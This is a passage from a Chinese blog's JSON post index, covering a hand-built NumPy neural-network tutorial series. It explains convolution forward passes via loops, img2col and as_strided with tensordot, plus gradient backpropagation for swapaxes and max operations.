0]$位置上的元素是3。剩下的其他位置也是同理。\n\n\n据此，我们已经推导出了整个新数组的真面目：\n\n\n$$\\begin{bmatrix}1&2&3\\\\3&4&5 \\end{bmatrix}$$\n\n\n相信读到这里，你大概确乎一定已经知道了`as_strides`的规则和用法了，那么它在卷积运算里有什么用呢？且看下文分解。\n\n\n\n\n---\n\n## 新的卷积方法\n\n\n依然以下面卷积过程为例子：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/a13db92f4878f4acc269505548995c38.gif)\n与img2col类似，我们也要将卷积核遍历过程中的每一块数据区域依次拿出来，但区别在于，我们不破坏数据自身的二维结构，也不将区域拉直处理，而是一个以下的过程：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/9e13226db29640dfb7630d304439be45.gif)\n这个过程应该比较容易理解，但需要注意的是，上图右侧得到的张量，其形状并非是`(6, 6)`，而是`(3, 3, 2, 2)`！虽然不知道大家是否可以理解这个表示方式，但我希望可以，它的外层是一个$3\\times 3$矩阵，其每一个元素都是一个$2\\times 2$矩阵。\n\n\n这样一种分割，看上去不是很自然，但这恰好是`as_strided`函数可以胜任的工作。接下来，我们需要把这个过程用`as_strided`函数写出来。\n\n\n\n```python\nimport numpy as np\nfrom numpy.lib.stride_tricks import as_strided\n\nx = np.array([[1, 0, 2, 1],\n              [0, 1, 3, 0],\n              [1, 1, 2, 1],\n              [0, 1, 3, 0]])\noutput = as_strided(x, shape=?, strides=?)\n```\n\n应该如何指定shape和strides参数，才能让output得到上面分割后的张量？首先容易得出shape是`(3, 3, 2, 2)`，因为它代表我期望得到的张量的形状。接下来我们来分析strides参数。\n\n\n输出张量共有四个轴，分别记为0、1、2、3轴，我们先分析最后的3轴，从输出张量的初始位置出发，沿着3轴移动一步的过程相当于下图：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/3917783cb4076c565a07127eab9baa7c.png)\n这一步对应到原数组上，相当于沿着1轴移了一步，注意到原数组的数据类型为int64，因此这一步移动对应的内存移动量为8个byte，相当于原数组的`strides[1]`，故3轴对应的strides参数值为8。\n\n\n接下来分析2轴的情况，从输出张量的初始位置出发，沿着2轴移动一步的过程相当于下图：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/fb6b7dfd6f04fbea4d809e7132667dbe.png)\n这一步对应到原数组上，相当于沿着0轴移了一步，因此这一步移动对应的内存移动量原数组的`strides[0]=32`个byte，故2轴对应的strides参数值为32。\n\n\n然后分析1轴，从输出张量的初始位置出发，沿着1轴移动一步的过程相当于下图：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/ad20a3f97142cdacdc50ff4a2b852097.png)\n这一步虽然看上去跨的比较远，但在原数组上，仅仅只是沿1轴移了一步，因为目标位置上的元素0，在原数组中的位置恰好就在1右边。因此这一步移动对应的内存移动量为8个byte，相当于原数组的`strides[1]`，故1轴对应的strides参数值也为8。\n\n\n最后分析0轴，从输出张量的初始位置出发，沿着0轴移动一步的过程相当于下图：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/3519130f1f71626e66c5cc2777620304.png)\n这一步移动，在原数组上相对于沿着0轴移了一步，因此这一步移动对应的内存移动量相当于原数组的`strides[0]=32`个byte，故0轴对应的strides参数值也为32。\n\n\n综合以上分析，strides应为`(32, 8, 32, 8)`。\n\n\n\n```python\nimport numpy as np\nfrom numpy.lib.stride_tricks import as_strided\n\nx = np.array([[1, 0, 2, 1],\n              [0, 1, 3, 0],\n              [1, 1, 2, 1],\n              [0, 1, 3, 0]])\noutput = as_strided(x, shape=(3, 3, 2, 2), strides=(32, 8, 32, 8))\n```\n\n这样写代码就可以把output算出来了，各位可以跑一下看看结果对不对。它的输出结果不像图片中的那样直观：\n\n\n\n```python\n>>> output\narray([[[[1, 0],\n         [0, 1]],\n        [[0, 2],\n         [1, 3]],\n        [[2, 1],\n         [3, 0]]],\n       [[[0, 1],\n         [1, 1]],\n        [[1, 3],\n         [1, 2]],\n        [[3, 0],\n         [2, 1]]],\n       [[[1, 1],\n         [0, 1]],\n        [[1, 2],\n         [1, 3]],\n        [[2, 1],\n         [3, 0]]]])\n```\n\n得到了output以后，如何用它来算卷积呢？这时又要请出另一个经常被大家忽略的函数：`tensordot`。\n\n\n\n\n---\n\n### tensordot函数\n\n\n`tensordot`这个函数，看名字好像是张量点积的意思，事实上它确实也正是做张量点积运算的，它的强大之处在于可以分别指定对两个张量的哪些轴进行点积运算。官方注释如下：\n\n\n\n```python\ndef tensordot(a, b, axes=2):\n    \"\"\"\n    Compute tensor dot product along specified axes.\n\n    Given two tensors, `a` and `b`, and an array_like object containing\n    two array_like objects, ``(a_axes, b_axes)``, sum the products of\n    `a`'s and `b`'s elements (components) over the axes specified by\n    ``a_axes`` and ``b_axes``. The third argument can be a single non-negative\n    integer_like scalar, ``N``; if it is such, then the last ``N`` dimensions\n    of `a` and the first ``N`` dimensions of `b` are summed over.\n\n    Parameters\n    ----------\n    a, b : array_like\n        Tensors to \"dot\".\n\n    axes : int or (2,) array_like\n        * integer_like\n          If an int N, sum over the last N axes of `a` and the first N axes\n          of `b` in order. The sizes of the corresponding axes must match.\n        * (2,) array_like\n          Or, a list of axes to be summed over, first sequence applying to `a`,\n          second to `b`. Both elements array_like must be of the same length.\n\n    Returns\n    -------\n    output : ndarray\n        The tensor dot product of the input.\n```\n\n参数非常简单，就是简单粗暴两个张量，以及一个坐标轴参数。我们重点讲axes参数的作用。官方注释对axes参数的描述分了两种情况，我们针对第二种来说明。\n\n\naxes参数是一个list，长度为2，其两个元素分别表示了两个张量的求和轴。\n\n\n在张量内积运算中，有两个概念，是我自己编出来的，一是求和轴（或固定轴），二是遍历轴，我们以最常见的矩阵乘法为例子，来说明这两个概念。\n\n\n$$\\begin{bmatrix}1&2&3\\\\4&5&6 \\end{bmatrix}\\times \\begin{bmatrix}2&3\\\\4&5\\\\6&7\\end{bmatrix}=\\begin{bmatrix}28&34\\\\64&79\\end{bmatrix}$$\n\n\n这两个矩阵的乘积可以看成如下顺序过程：\n\n\n1. 左矩阵的第一行与右矩阵的第一列做内积\n2. 左矩阵的第一行与右矩阵的第二列做内积\n3. 左矩阵的第二行与右矩阵的第一列做内积\n4. 左矩阵的第二行与右矩阵的第二列做内积\n\n这里，我们发现，对左矩阵而言，其在沿着列方向，遍历所有的行；对右矩阵而言，其在沿着行方向，遍历所有的列。每一次取到左矩阵的某一行与右矩阵的某一列，都将它们进行点积运算。\n\n\n这里我们就说，左矩阵的求和轴是行，对应1轴，遍历轴是列，对应0轴；同理，右矩阵的求和轴是0轴，遍历轴是1轴。我们就要在`tensordot`函数中指定axes参数为`[1, 0]`\n\n\n用`tensordot`的写法如下：\n\n\n\n```python\na = np.array([[1, 2, 3], [4, 5, 6]])\nb = np.array([[2, 3],[4, 5],[6, 7]])\nresult = np.tensordot(a, b, axes=[1, 0])\n```\n\n容易验证，该结果与直接`a.dot(b)`等价，可以说，`tensordot`就是`dot`函数的推广。另外，经过上面的演示，能够发现两个张量在各自求和轴上的长度一定是两两相等的。\n\n\n\n\n---\n\n### tensordot在卷积中的应用\n\n\n注意到，卷积运算好像也有类似于点积的操作——将每一块数据区域和卷积核进行的先乘后求和的运算就是一种点积，因此我们可以用`tensordot`来做卷积。\n\n\n这就是前面要把原矩阵进行奇奇怪怪的分割的原因了！依然是前面的例子，现在分割得到的张量，形状为`(3, 3, 2, 2)`，卷积核的形状为`(2, 2)`，不靠想象，直接根据这两个张量的形状，就可以迅速判断`tensordot`的axes参数值——`[(2, 3), (0, 1)]`\n\n\n\n```python\nimport numpy as np\nfrom numpy.lib.stride_tricks import as_strided\n\nx = np.array([[1, 0, 2, 1],\n              [0, 1, 3, 0],\n              [1, 1, 2, 1],\n              [0, 1, 3, 0]])\noutput = as_strided(x, shape=(3, 3, 2, 2), strides=(32, 8, 32, 8))\nkernel = np.array([[0, 1],\n                   [2, 0]])\nresult = np.tensordot(output, kernel, axes=((2, 3), (0, 1)))\n```\n\n\n```python\n>>> result\narray([[0, 4, 7],\n       [3, 5, 4],\n       [1, 4, 7]])\n```\n\n够不够简单粗暴！这种方法竟然一句显式的for循环都没用到。不过，上面这个例子太简单了，我们真正要用到的卷积，是四维卷积四维，但方法依然如出一辙，只是稍微复杂了一些。\n\n\n### 完整的卷积运算\n\n\n下面给出一个通用的split函数：\n\n\n\n```python\ndef split_by_strides(x: np.ndarray, kernel_size, stride=(1, 1)):\n    \"\"\"\n    将张量按卷积核尺寸与步长进行分割\n    :param x: 被卷积的张量\n    :param kernel_size: 卷积核的长宽\n    :param stride: 步长\n    :return: y: 按卷积步骤展开后的矩阵\n    \"\"\"\n    *bc, h, w = x.shape\n    out_H, out_W = (h - kernel_size[0]) // stride[0] + 1, (w - kernel_size[1]) // stride[1] + 1\n    shape = (*bc, out_H, out_W, kernel_size[0], kernel_size[1])\n    strides = (*x.strides[:-2], x.strides[-2] * stride[0],\n               x.strides[-1] * stride[1], *x.strides[-2:])\n    y = as_strided(x, shape, strides=strides)\n    return y\n```\n\n其实就是通过代码计算了`as_strided`函数需要的参数，首先确定目标的shape，思考一下就知道，前面例子里的形状`(3, 3, 2, 2)`的前两个3其实是卷积结果的H和W，后两个2其实是卷积核的h和w，这里的shape相比于前面的例子，要多两个维度，即B（Batchsize）和C（Channels），shape现在是个六元的tuple，其对应的strides参数应该也是六元。现在我们来确定strides，strides参数的最后两个位置，一定是与原张量最后两个轴的strides相同，因为它们对应的是同一个数据分块中，两个方向上的移动；倒数第三个位置，对应的是下面这个图的情况：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/ad20a3f97142cdacdc50ff4a2b852097.png)\n图中的例子里，仅仅是在原矩阵上跨越了一个元素的距离，但这其实是卷积步长为1时的特殊情形，一般的情形，该值是卷积横向的步长`stride[1]`$\\times$原矩阵末轴对应的stride，故倒数第三个位置应该为`x.strides[-1] * stride[1]`。\n\n\n倒数第四个位置，对应的情况则是：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/3519130f1f71626e66c5cc2777620304.png)\n与前面一个情况类似，需要考虑卷积纵向的步长`stride[0]`，结果为`x.strides[-2] * stride[0]`。\n\n\n现在，strides参数已经确定了最后的四个位置，只差前两个位置了，这两个位置其实更容易想到，因为第0个位置，对应的维度是B，在这个维度上移动一步需要跨越的内存空间，肯定就是两个相邻数据之间的跨越空间，故一定等于`x.strides[0]`；第1个位置对应维度是C，在这个维度上移动一步需要跨越的内存空间，就相当于同一个数据的两个相邻通道之间的跨越空间，故一定等于`x.strides[1]`。我在代码中，写成了更一般化的形式：`*x.strides[:-2]`，当x是四维张量时，它就相当于`(x.strides[0], x.strides[1])`。\n\n\n对于`tensordot`函数应该指定哪些轴作为求和轴，其实只要看两个张量的哪几个轴在进行内积运算。我们知道，卷积中的内积操作，发生在每一个数据区域和每一个卷积核之间，每一块数据区域包含的维度是C（Channels）、h（卷积核的高度）、w（卷积核的宽度），每个卷积核的维度也是C、h、w。而我们经过split后的数据，它的维度是六维（B, C, out_H, out_W, h, w），卷积核的维度则是(out_C, C, h, w)，那么数据对应的求和轴自然是(1, 4, 5)轴，卷积核对应的求和轴则是(1, 2, 3)轴。我们将两个张量形状里的(C, h, w)前后“约掉”，剩下的拼起来，就能得到输出结果的形状(B, out_H, out_W, out_C)，但我们不希望Channels维度放在最后，希望它换到第1个轴的位置，故我们还需要做一个`transpose`操作：`transpose((0, 3, 1, 2))`，即可得到形状为(B, out_C, out_H, out_W)的张量，这正是我们需要的卷积结果！\n\n\n全部的卷积过程，仅化为以下两步：\n\n\n\n```python\nsplit = split_by_strides(data, kernels.shape[-2:], stride=stride)\noutput = np.tensordot(split, kernels, axes=[(1, 4, 5), (1, 2, 3)]).transpose((0, 3, 1, 2))\n```\n\n\n\n---\n\n本文相对有点烧脑，需要各位好好琢磨琢磨`as_strided`和`tensordot`这两个函数的用法以及卷积运算的细节。至此，卷积运算的正向传播过程告一段落，后面的文章将进入卷积运算的反向传播。\n","tags":["Python","神经网络","卷积神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——卷积运算的正向传播（二）","url":"//blog/5945/","content":"\n本文仍然讲解卷积运算的正向传播方法，[前一篇文章](/blog/5912/)中我们用for循环将卷积运算实现了一下，重点关注的是卷积的运算过程，而并未对其进行优化，本文将引入一种相对比较容易想到的卷积优化方法——img2col。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n## img2col方法介绍\n\n\n“img2col太简单了，我早就会了！”→直接进入卷积正向传播的[第三篇文章](/blog/5977/)。\n\n\nimg2col的目的是将繁杂的卷积过程转化为一次矩阵乘法运算，从而大大降低运算量，为了减少语言上的琐碎描述，下面直接以图片来展示过程，先祭出前面文章里卷积过程的动图：\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/a13db92f4878f4acc269505548995c38.gif)\n注意到，卷积核每次在图像上移动时，都会与对应区域做一个内积运算（元素间相乘再求和），这一过程与矩阵乘列向量的过程十分类似，因此就有了以下操作：\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/beec12b38d0778180244ea898676d5ca.gif)\n上面演示的过程中，卷积核按顺序遍历图像一遍，每一次覆盖的数据区域展开为一行，并将所有的行拼接为一个矩阵，这就是img2col的核心步骤。\n\n\n在得到右侧绿色的矩阵后，我们将卷积核展开为一条列向量，并与绿色矩阵进行右乘：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/44832a010bb95b06a74b2297e090ec73.png)\n最后将结果reshape回$3\\times 3$，即可得到卷积结果：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/ba3719e705de9f7f7322bd20657e6186.png)\n以上，即是使用img2col进行卷积运算的思路。\n\n\n实际操作时，我们会有多个卷积核，同时我们还注意到，每个卷积核对同一幅图的卷积过程是完全独立的，因此我们可以将多个卷积核展开的列进行“横向”拼接，同样形成一个矩阵，这样操作，极大地提高了卷积运算的并行化效果。\n\n\n\n\n---\n\n## 代码\n\n\n首先是img2col函数：\n\n\n\n```python\ndef img2col(data, H_out, W_out, kh, kw, stride):\n    \"\"\"\n    :param data: 输入数据\n    :param H_out: 卷积结果的H\n    :param W_out: 卷积结果的W\n    :param kh: 卷积核的h\n    :param kw: 卷积核的w\n    :param stride: 卷积步长\n    :return: img2col操作得到的矩阵\n    \"\"\"\n    B, C, H, W = data.shape\n    out_mat = np.zeros((B, H_out * W_out, C * kh * kw))\n    for b in range(B):\n        for h in range(H_out):\n            for w in range(W_out):\n                out_mat[b, h * W_out + w] = data[b, :, h * stride: h * stride + kh, w * stride: w * stride + kw].flatten()\n    return out_mat\n```\n\n卷积过程：\n\n\n\n```python\nB = 2  # batchsize\nC_in = 3  # channels_in\nC_out = 5  # channels_out\nH = 4  # Height of image\nW = 5  # Width of image\nkh = kw = 2  # kernel size\nstride = 1  # stride for convolution\ndata = np.random.rand(B, C_in, H, W)  # 随机生成被卷积的数据\nkernels = np.random.rand(C_out, C_in, kh, kw)  # 随机生成C_out个卷积核,写在一个张量里\n# 计算卷积结果的长宽\nH_out = (H - kh) // stride + 1\nW_out = (W - kw) // stride + 1\n\nflatten_data = img2col(data, H_out, W_out, kh, kw, stride)\nflatten_kernels = np.reshape(kernels, (C_out, -1)).T\nresult = flatten_data.dot(flatten_kernels).swapaxes(-1, -2).reshape(B, C_out, H_out, W_out)\n```\n\n该操作好处是在for循环中避免了矩阵运算，并且减少了一重for。代码具体的细节我就懒得讲了，各位可以自己琢磨一下，实现一下img2col过程。\n\n\n不过这个方法仍然不够优雅，后续的文章里，一种不需要（在Python中）写for循环的卷积方法即将正式展开，我将继续以尽可能简单的方式，努力介绍这种优雅高效的方法，文体两开花，弘扬深度学习精神，希望大家多多关注！\n","tags":["Python","神经网络","卷积神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——卷积运算的正向传播（一）","url":"//blog/5912/","content":"\n在传统图像处理中，卷积占据了非常大的比重，在Transformer出来之前，卷积神经网络（CNN）也长期霸榜CV领域的深度学习任务。\n\n而虽然现在有Transformer等利器，但卷积神经网络仍是众多场景任务中的一把手，尚未有被取代的迹象。\n\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n## 为啥要单独讲卷积\n\n\n以下，就是卷积神经网络的示意图：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/1305e0643765dea4ba151b65c78b96a9.png)\n...不好意思放错了，下面这个才是：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/webp/2db2e9b849f6949165a878ef117157d6.webp)\n\n![](https://oss.fyz666.xyz/blogfiles/png/70aac277b8622b592db83c23c1904c45.png)\n\n卷积核长宽均为2、且步长为2的卷积过程示意图\n\n\n卷积运算因为其不同于其他张量运算的规则以及其重要程度，被我单独拎出来讲，还有一个原因是，卷积虽然不难理解，但其反向传播很容易掉脑细胞。不过，卷积的正反向传播都有一些trick，使用了trick后，算对只是基本操作了，还能让卷积和反向传播的速度非常的快（使用trick后的卷积运算已经和CPU版的PyTorch的卷积运行效率相近了）。\n\n\n卷积运算也是需要花大篇幅讲解正向传播过程的一个运算。为了避免一步到位导致的脑细胞快速死亡，我们仍然从最基本的卷积写法开始展开，觉得自己牛逼的一批的同学可以直接进入卷积正向传播的[第二篇文章](/blog/5945/)。\n\n\n卷积的过程，因为过于易懂，本文不再放图，大概就是有一个被称为卷积核的块，从左上到右下对整个图进行滑动遍历，在遍历的过程中，依次计算卷积核与对应块的内积，放到卷积结果的对应位置上。\n\n\n算了还是放个动图以示诚意吧。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/a13db92f4878f4acc269505548995c38.gif)\n由于卷积运算带有明显的循环过程，导致我们在手写卷积时，最直接的想法就是做循环。没错，本文将先使用for循环来写卷积，目的是先熟悉卷积的过程，这样才能在后面的各种骚操作中游刃有余。\n\n\n与大部分图片展示的卷积不同，在实际应用中，所谓的二维卷积其作用对象往往不止二个维度（我们只讨论对图片数据的卷积，而不考虑对序列数据的卷积，即所谓的一维卷积，事实上一维的卷积可以转化成二维的一种特殊形式来解决），我们知道普通的图片分为RGB三个通道，这会导致图片数据一般都是三维的，因此一般卷积神经网络的输入维度除了长宽两个维度外，还多了一个通道维度，另外，各卷积层的输出通常也有多个通道，所以我们通常说的卷积，卷积对象的维度至少也是3维。另外，在神经网络训练过程中，我们经常要把多个数据同时输入神经网络，这意味着数据又会多出来一个维度，直奔四维，这个概念在活在三维世界中的地球人的脑子里已经是想象不出来了，我们只能通过数学上的一些计算来推导卷积过程的性质。\n\n\n## 卷积结果的形状\n\n\n首先我们要对卷积运算中各张量的形状非常熟悉，在我的表述习惯里，被卷积张量的形状定义为(B, C, H, W)，四个维度，这四个字母分别表示\n\n\n- B：Batchsize\n- C：Channels\n- H：Height\n- W：Width\n\nBatchsize意为同时塞入神经网络的一批数据的数据量，Channels表示通道数。这个顺序和Pytorch里面的顺序是一致的，但Tensorflow等框架似乎更习惯于把Channel维度置于最后，即(B, H, W, C)，不同顺序各有各的好处，建议视自己的思考习惯而定。\n\n\n为了清晰起见，我们先考虑一个图片数据进入卷积层的过程，图片的形状是(C, H, W)，对于卷积神经网络的卷积层而言，因为其需要捕捉图片的不同特征，故一般卷积层会有好几个卷积核，每一个卷积核将分别与输入的图片进行卷积。这里卷积核和图片一样，虽然图上画出来是二维，但实际上却有“厚度”，卷积核的“厚度”应该与输入图片的“通道数”一致，故也称为卷积核的通道数。\n\n\n对于每一个卷积核，其在图片上循环移动的过程都将输出一张特征图，这特征图是实实在在的二维矩阵，不具有通道维度。多个卷积核将输出多张二维的特征图，将所有特征图在第三个维度堆叠起来，我们仍然会得到一张具有通道概念的三维特征图。这个三维的特征图，即是卷积层对一张图片的输出。\n\n\n现在考虑一堆数据（B个）同时进入卷积层的情况，这时，由上面的解释，对每一个输入的数据，卷积过程都会生成一张三维的特征图，那么将多个数据的特征图继续在第四个维度上堆叠起来，我们就会得到一个四维张量，这也是卷积层真正的输出！和输入一样，是四维的，而且形状仍然可以表示为(B, C, H, W)，不过输出的B、C、H、W分别变成了多少，这就需要从数学上进行计算了。\n\n\n为了讨论这个问题，我们假设输入的数据形状为(B0, C0, H0, W0)，卷积核共有C个，每个卷积核的形状为(C0, h, w)，卷积步长为S，输出的形状为(B1, C1, H1, W1)。\n\n\n由上面描述的过程，易知B1=B0，即输入多少个数据，输出就有多少个数据，并且，输出数据的通道数应该相当于卷积核的数量（因为每个卷积核会生成一张特征图，最后的输出是将所有特征图叠起来），因此C1=C。\n\n\n接下来就是H1和W1的计算了，这部分的计算其实与平面上做卷积没有区别，我们可以列出不等式：\n\n\n$$(W1-1)S + w\\le W0$$\n\n\n$$(H1-1)S + h\\le H0$$\n\n\n$W1、H1$为满足不等式的最大整数解，可以算出\n\n\n$$W1=\\lfloor \\frac{W0-w}{S} \\rfloor + 1$$\n\n\n$$H1=\\lfloor \\frac{H0-h}{S} \\rfloor + 1$$\n\n\n\n\n---\n\n## 卷积的简单实现\n\n\n接下来我们就可以通过for循环来写卷积的正向传播了，首先通过输入数据的形状，计算出输出数据的形状，并初始化输出数据为零张量。\n\n\n然后遍历B0个数据以及C个卷积核，再依次遍历输出矩阵的长和宽，每一次遍历时，从输入张量中找出卷积作用域，与当前遍历到的卷积核进行点积运算，得到的结果塞到输出张量的对应位置。\n\n\n随便写了一下代码，如下所示：\n\n\n\n```python\nimport numpy as np\n\nB = 2  # batchsize\nC_in = 3  # channels_in\nC_out = 5  # channels_out\nH = 4  # Height of image\nW = 5  # Width of image\nkh = kw = 2  # kernel size\nstride = 1  # stride for convolution\ndata = np.random.rand(B, C_in, H, W)  # 随机生成被卷积的数据\nkernels = np.random.rand(C_out, C_in, kh, kw)  # 随机生成C_out个卷积核,写在一个张量里\n# 计算卷积结果的长宽\nH_out = (H - kh) // stride + 1\nW_out = (W - kw) // stride + 1\n# 初始化输出结果\noutput = np.zeros(shape=(B, C_out, H_out, W_out))\n# 愚蠢的四重for循环\nfor b in range(B):\n    for c in range(C_out):\n        kernel = kernels[c]\n        for h in range(H_out):\n            for w in range(W_out):\n                data_field = data[b, :, h * stride: h * stride + kh, w * stride: w * stride + kw]\n                output[b, c, h, w] = (data_field * kernel).sum()\n```\n\n四重for循环显得格外刺眼，但不得不说这段代码的可读性非常强！有利于我们充分掌握卷积的过程。\n\n\n需要注意的是，实际写代码时，我们也会将多个卷积核在第四个维度上堆叠起来，所以代码中的`kernels`是一个四维的张量。因此，一般的卷积过程实际上是四维张量卷积四维张量。\n\n\n以上，就是卷积运算的通俗写法，当然我感觉这个写法不利于写反向传播，同时for循环多了几层，运行效率低下。虽然上面代码仍可以进行优化，但我认为没有这个必要，通过for循环来写的卷积再怎么优化也没办法从根本上突破。我只是为了说明卷积的过程而临时用for循环写了一下。\n\n\n接下来一篇文章将进入卷积正向传播的第一种骚操作，也是一种比较容易想到的操作——img2col。\n","tags":["Python","神经网络","卷积神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——梯度反传函数具体怎么写？（三）","url":"//blog/5883/","content":"\n本文将介绍几种特殊张量运算的反向传播。\n\n\n众所周知，神经网络中涉及到关于张量的运算不止于加减乘除，还有最大最小值运算等，与常规运算不同，有些特殊运算在数学上甚至是不可微的，但即便如此，我们仍然需要将梯度反传回去。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n本文将介绍Swapaxes运算、Max运算的反向传播。其他特殊运算，就不再一一列举！（主要太懒了）\n\n\n## Swapaxes\n\n\n与矩阵的转置类似，张量运算swapaxes的目的就是交换某两个轴，其定义为：\n\n\n\n```python\ndef swapaxes(self, axis1, axis2):\n    ...\n```\n\naxis1、axis2即为交换的两个轴的序号。稍微想一想容易知道，怎么换过去的就怎么换回来，反传回去的梯度应该就是把梯度的axis1、axis2轴交换一下。所以在正向传播时，我们就要把两个交换轴的序号记录在计算图里。\n\n\n正向传播：\n\n\n\n```python\ndef swapaxes(self, axis1, axis2):\n    result = Tensor(self.data.swapaxes(axis1, axis2), dtype=self.dtype, requires_grad=self.requires_grad)\n    if result.grad_enable:\n        result.children = [(self, axis1, axis2)]\n        result.grad_fn = SwapaxesBackward()\n    return result\n```\n\n反向传播：\n\n\n\n```python\nclass SwapaxesBackward(BackwardFcn):\n    def __init__(self):\n        super(SwapaxesBackward, self).__init__()\n\n    def calculate_grad(self, grad, children, place):\n        axis1, axis2 = children[0][1:]\n        return grad.swapaxes(axis1, axis2)\n```\n\n是不是非常ez！还有很多其他运算，例如Transpose等，也需要记录一些额外的信息。另外，有一些运算虽然并不需要额外信息，但若提供了额外的信息，会对梯度计算有很大的帮助，例如大名鼎鼎的交叉熵函数，各位可以自己推导一下交叉熵函数的梯度，然后思考一下提供什么信息可以加快交叉熵函数梯度的计算。推导过程可以看我[这篇文章](/blog/5174/)。\n\n\n## Max\n\n\nMax运算在数学上是一个分段的函数，和绝对值函数一样，在分段端点处不可微，在神经网络里经常遇到各种取最大值的运算，常见的例如MaxPooling。虽然它存在不可微点，但我们仍然有办法搞出一个形式上的梯度，并将其反传回去。\n\n\n考虑以下$2\\times 3$矩阵：\n\n\n$$\\begin{bmatrix}1&2&3\\\\ 4&5&6 \\end{bmatrix}$$\n\n\n对其做max运算有三种情况：1、全局max；2、对每一行取max；3、对每一列取max。对于这些情况，我们的代码中均需要实现梯度反向传播。不过，在写梯度反传函数以前，需要先看一下梯度要怎么传。\n\n\n第一种情况，对全局取max，得到的结果为6：\n\n\n$$Max(\\begin{bmatrix}1&2&3\\\\ 4&5&6 \\end{bmatrix})=6$$\n\n\n我们将梯度这个概念还原回最本质的东西，即当某一个量$x$发生微小的变化$\\delta x$时，结果产生的变化$\\delta y$与这个小改变量$\\delta x$比值$\\delta y / \\delta x$的极限。在这个全局的max运算下，根据max的逻辑可知，对任何非最大值进行微小的改变，均不会影响到最终的结果；而当最大值所在的位置发生微小的改变时，结果也将产生等值的改变。综合上面的考虑，它的梯度就应该是长这样的：\n\n\n$$\\begin{bmatrix}0&0&0\\\\ 0&0&1 \\end{bmatrix}$$\n\n\n后两种情况，其实可以统一为一种情况，即对某些轴取max（可以不止一个轴），这里通过对行取max的例子来研究一下规律。\n\n\n首先需要改变一下说法，所谓对“行”取max，过程是固定矩阵的“行”进行遍历，在每一行中找出最大值，相当于在max运算中指定axis=1，而对“列”取max，同理相当于axis=0，但在高维张量的情况下，就没有行和列的概念了，故以后都将用遍历轴axis来说明。\n\n\n$$Max(\\begin{bmatrix}1&2&3\\\\ 4&5&6 \\end{bmatrix}, axis=1)=\\begin{bmatrix}3&6\\end{bmatrix}$$\n\n\n类似地，同样容易得到梯度回传系数为\n\n\n$$\\begin{bmatrix}0&0&1\\\\ 0&0&1 \\end{bmatrix}$$\n\n\n即，在两个最大值所处的位置上为1，其余为0。这也符合常人的理解。\n\n\n还有一种特殊情况，即存在多个最大值的情况，例如：\n\n\n$$Max(\\begin{bmatrix}1&2&3\\\\ 4&6&6 \\end{bmatrix})=6$$\n\n\n这种情况我将其处理为多个最大值按相同权重均分梯度，得到的梯度回传系数如下：\n\n\n$$\\begin{bmatrix}0&0&0\\\\ 0&0.5&0.5 \\end{bmatrix}$$\n\n\n\n\n---\n\n综合以上考虑，我们就可以着手进行代码的实现了。这里我的思路是，将max运算得到的结果以及axis值存在计算图中，反向传播时调用这两个量，将max得到的结果通过复制自身的方式，扩展到与原张量相同。  \n回到这个例子：\n\n\n$$Max(\\begin{bmatrix}1&2&3\\\\ 4&6&6 \\end{bmatrix}, axis=1)=\\begin{bmatrix}3&6\\end{bmatrix}$$\n\n\n可以先将max得到的结果$\\begin{bmatrix}3 & 6\\end{bmatrix}$经过以下两步变换：\n\n\n1. 根据axis的值添加维度，使结果成为keepdims=True的形式（对keepdims这个参数不太了解的童鞋可以先去了解一下）。\n2. 根据原张量的形状，在axis的方向上tile自身。\n\n$$\\begin{bmatrix}3 & 6\\end{bmatrix}=>\\begin{bmatrix}3 \\\\ 6\\end{bmatrix}=>\\begin{bmatrix}3&3&3\\\\ 6&6&6\\end{bmatrix}$$\n\n\n然后将扩展后的结果，与原张量进行比较：\n\n\n$$\\begin{bmatrix}3&3&3\\\\ 6&6&6\\end{bmatrix}==\\begin{bmatrix}1&2&3\\\\ 4&6&6 \\end{bmatrix}=\\begin{bmatrix}False&False&True\\\\ False&True&True \\end{bmatrix}=>\\begin{bmatrix}0&0&1\\\\ 0&1&1 \\end{bmatrix}$$\n\n\n最后沿着所有axis进行归一化（和为1）：\n\n\n$$\\begin{bmatrix}0&0&1\\\\ 0&1&1 \\end{bmatrix}=>\\begin{bmatrix}0&0&1\\\\ 0&0.5&0.5 \\end{bmatrix}$$\n\n\n处理的过程大概就是上面这样，细节可以看我的MaxBackward代码！对于Min和Mean运算，大体也差不多，故不再重复。\n\n\n\n\n---\n\n张量的特殊运算还有一大堆，但这里空白太小，我写不下。不过，相信看到这里，推导梯度并将其转换为代码实现对你而言应该不是什么大难题了！接下来的内容将围绕著名的卷积神经网络展开，重点讲解卷积运算的正向、反向传播，还会补充池化运算以及BN层的细节。\n","tags":["Python","神经网络","反向传播"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——梯度反传函数具体怎么写？（二）","url":"//blog/5837/","content":"\n[上篇文章](/blog/5783/)的文末对广播机制对梯度反向传播的影响做了点讨论，但在张量运算方面仍留了两个坑，本文将努力填掉第一个坑：张量乘法。\n\n本系列全部代码见下面仓库：\n\n{% link 